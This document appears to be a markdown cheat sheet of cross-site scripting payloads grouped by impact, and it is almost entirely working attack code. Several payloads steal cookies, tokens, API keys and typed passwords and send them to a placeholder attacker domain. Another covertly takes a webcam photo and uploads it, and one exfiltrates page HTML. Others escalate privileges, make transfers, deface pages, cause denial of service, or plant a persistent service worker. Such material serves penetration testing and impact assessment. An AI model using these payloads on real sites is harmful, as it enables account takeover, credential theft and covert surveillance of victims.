# XSS (Cross-Site Scripting)

## Table of Contents

- [Credential Stealing](#credential-stealing)
- [Performing Actions as the Victim](#performing-actions-as-the-victim)
- [Web API Abusing](#web-api-abusing)
- [Content Spoofing](#content-spoofing)
- [Data Exfiltration](#data-exfiltration)
- [Denial of Service](#denial-of-service)
- [Persistent Access](#persistent-access)

## Credential Stealing

### Credentials used for authentication (e.g., cookie, access token) can be stolen.

- Cookie stealing
    ```html
    <script>
        fetch(`https://[ATTACKER-DOMAIN]/?cookie=${document.cookie}`)
    </script>
    ```

- Token stealing
    ```html
    <script>
        fetch(`https://[ATTACKER-DOMAIN]/?token=${localStorage.getItem("token")}`)
    </script>
    ```

- API key stealing
    ```html
    <script>
        fetch('/myinfo')
            .then(response => response.json())
            .then(data => {
                return fetch(`https://[ATTACKER-DOMAIN]/?api_key=${data.api_key}`)
            })
    </script>
    ```

- Capturing credentials as they are submitted
    ```html
    <script>
        document.addEventListener('submit', (event) => {
            const data = new URLSearchParams(new FormData(event.target));
            navigator.sendBeacon('https://[ATTACKER-DOMAIN]/', data);
        }, true);
    </script>
    ```
    Unlike a stolen cookie, a captured password stays usable after the session ends and may also work on other services where the victim reused it.

## Performing Actions as the Victim

### Requests can be sent from the victim's browser with their session, so any action available to the victim can be performed on their behalf.

- Making a transfer
    ```html
    <script>
        initiateTransaction("attacker_account", 1000)
    </script>
    ```

- Privilege escalation
    ```html
    <script>
        fetch('https://[VULNERABLE-SERVICE]/change-role', {
            method: 'POST',
            body: "user_id=1234&role=admin"
        })
    </script>
    ```

## Web API Abusing

### Web browser-provided APIs (e.g., Media Stream API, Clipboard API) can be exploited to access OS features.

- Camera access
    ```html
    <script>
        document.addEventListener('DOMContentLoaded', async () => {
            const v = document.createElement('video');
            v.autoplay = true;
            v.style.display = 'none';
            document.body.appendChild(v);

            const c = document.createElement('canvas');
            c.style.display = 'none';
            document.body.appendChild(c);

            const s = await navigator.mediaDevices.getUserMedia({
                video: true
            });
            v.srcObject = s;

            setTimeout(() => {
                const ctx = c.getContext('2d');
                c.width = v.videoWidth;
                c.height = v.videoHeight;
                ctx.drawImage(v, 0, 0);

                c.toBlob(b => {
                    const f = new FormData();
                    f.append('image', b, 'photo.png');
                    fetch('https://[ATTACKER-DOMAIN]/images', {
                        method: 'POST',
                        body: f
                    });
                }, 'image/png');
            }, 1000);
        });
    </script>
    ```

## Content Spoofing

### Elements of the page can be modified through DOM manipulation.

- Defacement
    ```html
    <script>
    document.body.innerHTML = `
        <div style="position:fixed; top:0; left:0; width:100%; height:100%; background-color:black; display:flex; align-items:center; justify-content:center; color:red; font-size:3em; font-family:sans-serif; z-index:10000;">
        You've been hacked
        </div>
    `;
    </script>
    ```

## Data Exfiltration

### Sensitive data on the page can be exfiltrated. This is especially useful in Blind XSS scenarios, where an attacker can capture the contents of an internal or administrative page they cannot see directly.

- Exfiltrating page content
    ```html
    <img src=nonexistent_src onerror=fetch('https://[ATTACKER-DOMAIN]',{method:'POST',body:btoa(unescape(encodeURIComponent(document.documentElement.outerHTML)))})>
    ```

## Denial of Service

### An attacker can cause a denial of service by making the user's browser or the web server unresponsive.

- Cookie bomb
    ```html
    <script>
        for (let i = 0; i < 100; i++) {
            document.cookie = `bomb${i}=${Array(1000).join('A')}`;
        }
    </script>
    ```

- IP blocking through rapid login attempts
    ```html
    <script>
        // Rate limiting or threshold-based blocking can be triggered, causing legitimate users to be temporarily or permanently blocked
        for (let i = 0; i < 1000; i++) {
            fetch('/login', {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/x-www-form-urlencoded'
                },
                body: `username=user&password=pass${i}`
            });
        }
    </script>
    ```

## Persistent Access

### A service worker registered by the payload keeps intercepting requests on later visits, even after the injected payload has been removed. [^1]

- Registering a service worker
    ```html
    <script>
        // The worker script must be served from the vulnerable origin, e.g., as an uploaded file
        navigator.serviceWorker.register('/uploads/sw.js');
    </script>
    ```
    The worker can read and rewrite the responses of pages within its scope, and it stays registered until it is explicitly removed or the victim clears the site's data.

[^1]: Applies when the attacker can serve a JavaScript file from the vulnerable origin, such as an uploaded file or a JSONP endpoint. The worker controls only pages under the script's directory unless the response widens its scope with the `Service-Worker-Allowed` header.
